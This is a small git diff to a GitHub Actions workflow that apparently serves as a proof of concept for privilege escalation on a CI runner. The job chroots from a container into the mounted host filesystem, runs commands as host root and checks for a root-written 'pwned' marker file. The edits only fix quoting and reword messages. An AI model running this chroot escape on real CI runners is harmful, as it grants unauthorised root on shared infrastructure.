@@ -22,7 +22,7 @@ jobs:
 
             echo "chroot into host filesystem and run commands as host root"
             chroot /host bash -c "
-              echo \"Post chroot command now" 
+              echo \"Post chroot command now\" 
               echo \"whoami: \$(whoami)\"
               echo \"id: \$(id)\"
               
@@ -38,5 +38,5 @@ jobs:
           '
     
           echo
-          echo "Back on host as runner, verifying root-created marker using priv esc"
-          ls -l /pwned_by_root_from_github_actions.txt || echo "[-] Marker missing (exploit failed)"
+          echo "Back on host as runner, verifying root-created poc file using priv esc"
+          ls -l /pwned_by_root_from_github_actions.txt || echo "poc file missing (exploit failed)"
